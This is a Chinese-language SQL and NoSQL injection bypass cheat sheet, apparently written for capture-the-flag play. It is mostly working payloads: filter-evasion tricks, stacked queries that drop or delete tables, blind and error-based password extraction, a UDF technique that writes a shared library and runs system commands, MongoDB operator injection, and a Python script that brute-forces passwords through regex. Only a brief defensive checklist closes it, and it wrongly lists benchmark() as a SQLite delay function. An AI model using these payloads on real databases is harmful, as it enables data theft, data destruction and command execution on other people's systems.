# SQL注入绕过秘笈

## ORDER BY注入
```sql
-- 探测列数
SELECT * FROM users ORDER BY 1; -- 逐增加直到报错
SELECT * FROM users ORDER BY (CASE WHEN 1=1 THEN 1 ELSE 2 END);  -- 条件判断
ORDER BY (select*from(select(sleep(5)))a)  -- 时间延迟
```

## 宽字节注入
```sql
-- GBK编码绕过转义
SELECT * FROM users WHERE name = 0xbf27 OR 1=1;
-- 0xbf27被解释为一个汉字，后续'为普通字符
SELECT * FROM users WHERE name = CHAR(0x62,0x66,0x27) OR 1=1;
```

## 类型混淆注入
```sql
-- 数字进制混淆
SELECT * FROM users WHERE id = 010;      -- 八进制8
SELECT * FROM users WHERE id = 0x10;     -- 十六进制16
SELECT * FROM users WHERE id = 1e1;      -- 科学计数法10

-- 字符串转数字：'1a'→1, 'a1'→0
UNION SELECT NULL,NULL,NULL;            -- 类型推断
UNION SELECT 1,'a',CAST(1 AS CHAR);     -- 类型转换
```

## 注释和空格替代
```sql
-- 多种注释方式：-- # /**/
-- 空格替代：/**/ () +
SELECT /**/1/**/FROM/**/users;  -- 注释替代空格
SELECT * FROM users WHERE 1=1 OR /*!50000*/1=1;  -- MySQL版本注释
```

## 编码绕过
```sql
-- 十六进制编码
SELECT * FROM users WHERE name = 0x61646d696e;  -- 'admin'
SELECT * FROM users WHERE id = CHAR(97,100,109,105,110);

-- 双URL编码：%2531 = %31 = 1
-- hex()函数绕过正则过滤
0' UNION SELECT 1,2,hex((SELECT password FROM users WHERE username='flag'))%23
-- 结果为十六进制，如'666C61677B7878787D'需解码
```

## 二阶SQL注入
```sql
-- 缓存污染
INSERT INTO config VALUES (''; DROP TABLE users; --');
SELECT * FROM users WHERE setting = (SELECT value FROM config);
-- 从缓存读取的数据被拼接到新查询中

-- 参数化第一步，拼接第二步（错误）
$result = db.query("SELECT value FROM config WHERE key = ?", [userInput]);
$finalQuery = "SELECT * FROM users WHERE filter = '" . $result[0]['value'] . "'";
```

## 堆叠查询注入
```sql
-- 多语句执行（MySQL某些情况、MSSQL）
SELECT * FROM users; DROP TABLE users;
1; DELETE FROM users WHERE 1=1 --

-- 条件执行
SELECT * FROM users WHERE id = IF(1=1, 1, 2);
SELECT * FROM users WHERE id = CASE WHEN 1=1 THEN 1 ELSE 2 END;

-- 时间延迟
-- MySQL: SLEEP(5)
-- PostgreSQL: pg_sleep(5)
-- MSSQL: WAITFOR DELAY '00:00:05'
-- SQLite: benchmark(5000000, MD5('test'))
SELECT * FROM users WHERE id = 1 AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a', SLEEP(5), 0);
```

## 盲注加速
```sql
-- 二分法加速（非逐字符）
SELECT * FROM users WHERE (SELECT SUBSTRING(password,1,1)) > 'm';

-- 基于错误的盲注
SELECT * FROM users WHERE id = 1 AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT password LIMIT 1)));

-- 基于布尔的盲注
SELECT * FROM users WHERE id = 1 AND 1=1;  -- 条件真
SELECT * FROM users WHERE id = 1 AND 1=2;  -- 条件假
```

## 高级过滤绕过

### WHERE子句绕过
```sql
-- HAVING替代WHERE
SELECT id,name FROM users HAVING id=1;

-- JOIN+ON替代WHERE
SELECT u.* FROM users u JOIN users u2 ON u.id=u2.id WHERE u.id=1;

-- 直接访问系统表（跳过WHERE）
SELECT user FROM mysql.user;
```

### SELECT关键词混淆
```sql
-- 大小写混淆
SeLeCt * FROM users WHERE id=1;

-- 注释混淆
S/**/E/**/L/**/E/**/C/**/T * FROM users;

-- INFORMATION_SCHEMA查询
SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE();
SELECT column_name FROM information_schema.columns WHERE table_name='users';
```

### 字符串和引号混淆
```sql
-- 十六进制、CHAR、CONCAT
SELECT * FROM users WHERE name = 0x61646d696e;  -- 'admin'
SELECT * FROM users WHERE name = CHAR(97,100,109,105,110);
SELECT * FROM users WHERE name = CONCAT(0x61, 0x64);
```

### 数据库识别
```sql
-- MySQL: SELECT @@version; SELECT USER(); SELECT * FROM mysql.user;
-- MSSQL: SELECT @@version; SELECT CURRENT_USER; SELECT name FROM master.dbo.sysdatabases;
-- PostgreSQL: SELECT version(); SELECT current_user; SELECT datname FROM pg_database;
-- Oracle: SELECT banner FROM v$version; SELECT USER FROM dual;
```

## UDF注入
利用条件：MySQL/MariaDB、FILE权限、知道插件目录、支持堆叠查询

```sql
-- 1. 创建临时表存储恶意SO文件
CREATE TABLE temp(data LONGBLOB);

-- 2. 分段插入hex数据（UDF.SO文件）
INSERT INTO temp(data) VALUES (0x7F454C46...);
UPDATE temp SET data = CONCAT(data, 0x...);

-- 3. 写入插件目录
SELECT data FROM temp INTO DUMPFILE '/usr/lib/mariadb/plugin/udf.so';
-- 查询路径: SELECT @@plugin_dir;

-- 4. 创建自定义函数
CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.so';

-- 5. 执行系统命令
SELECT sys_eval('cat /flag');
UPDATE ctfshow_user SET pass=(SELECT sys_eval('cat /flag'));
```

快速定位：搜索`into dumpfile`、`create function`、`soname`、`FILE权限`

## NoSQL注入

### MongoDB操作符
```javascript
$gt/$gte/$lt/$lte  -- 比较: > >= < <=
$ne  -- 不等于 !=
$in/$nin  -- 在...中/不在...中
$regex  -- 正则匹配
$or/$and  -- 逻辑操作
```

### 常见绕过
```php
// 操作符注入（覆盖原值）
username[$ne]=1&password[$ne]=1
// 等价于: username != 1 AND password != 1

// 正则表达式注入
username[$regex]=flag&password[$regex]=^f.*  // 逐字符推断密码

// 数组注入
id[]=flag
```

### 正则盲注脚本
```python
import string, requests
url = "http://target.com/api/"
letters = "{}-_" + string.ascii_lowercase + string.digits

def valid_pass(password: str) -> bool:
    data = {"username[$regex]": "flag", "password[$regex]": f"^{password}.*"}
    response = requests.post(url, data=data)
    return "登陆成功" in response.json()["msg"]

result = ""
for letter in letters:
    if valid_pass(result + letter):
        result += letter; print(f"[*] {result}")
        break
```

快速定位：`MongoDB\Driver\Query`、`executeQuery`、`find()`、直接拼接用户输入

## 快速定位和利用

**关键词识别**：
- ORDER BY无参数化 | WHERE直接拼接用户输入 | 缺少参数化的原生SQL
- UDF: `into dumpfile` `create function` `soname`
- NoSQL: `MongoDB\Driver\Query` `find()` 直接拼接

**测试优先级**：
1. 数字型（ORDER BY探测列数）
2. 字符型（引号闭合）
3. UNION SELECT（推断列数和类型）
4. 盲注（时间延迟、错误信息、布尔）
5. 堆叠查询（多语句执行）
6. 高级过滤绕过（WAF、关键词）
7. 二阶注入（缓存污染）
8. 数据库特定功能（版本识别）
9. UDF注入（FILE权限、堆叠）
10. NoSQL注入（MongoDB、Redis等）

## 防御检查清单
- ✓ 所有查询使用参数化（?占位符或命名参数）
- ✓ 白名单验证ORDER BY列名
- ✓ 避免拼接来自缓存的SQL片段
- ✓ 验证从数据库读取的值在再次使用时
- ✓ 使用ORM框架的安全查询方法
- ✓ 限制FILE权限，避免UDF注入
- ✓ 禁用堆叠查询（多语句执行）
- ✓ 限制插件目录写入权限
- ✓ NoSQL：参数化查询，白名单操作符，类型检查
